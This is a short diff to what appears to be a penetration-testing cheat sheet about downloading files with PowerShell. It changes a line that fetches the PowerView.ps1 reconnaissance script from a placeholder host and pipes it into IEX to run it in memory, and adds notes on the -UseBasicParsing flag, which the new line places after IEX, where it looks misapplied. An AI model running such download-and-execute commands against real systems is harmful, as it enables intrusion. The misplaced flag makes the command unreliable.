@@ -93,9 +93,10 @@ Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
 
 #### Can be bypassed using `-UseBasicParsing`
 ```powershell
-Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing
 ```
-- This makes powershell 
+- This makes powershell not use Internet Explorer's HTML parsing engine
+- Only for windows powershell 5.1 or earlier
 
 #### Workaround for invalid SSL/TLS
 ```powershell
